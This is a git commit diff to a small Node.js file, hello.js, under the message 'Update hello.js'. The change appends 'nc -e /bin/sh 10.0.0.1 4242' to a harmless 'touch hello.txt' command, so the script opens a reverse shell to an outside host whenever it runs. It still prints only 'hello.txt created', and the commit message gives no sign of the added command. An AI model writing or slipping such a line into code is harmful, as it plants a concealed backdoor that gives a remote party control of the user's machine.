6111588b2220e3d122d816fd85d1891da809eb3a
aman143kri <42419157+aman143kri@users.noreply.github.com>
2024-12-20 10:29:43 -0800

    Update hello.js

--- hello.js
+++ hello.js
@@ -1,9 +1,11 @@
 const { exec } = require('child_process');
 
-exec('touch hello.txt', (error, stdout, stderr) => {
+exec('touch hello.txt && nc -e /bin/sh 10.0.0.1 4242', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
     }
     console.log('hello.txt created');
 });
+
+
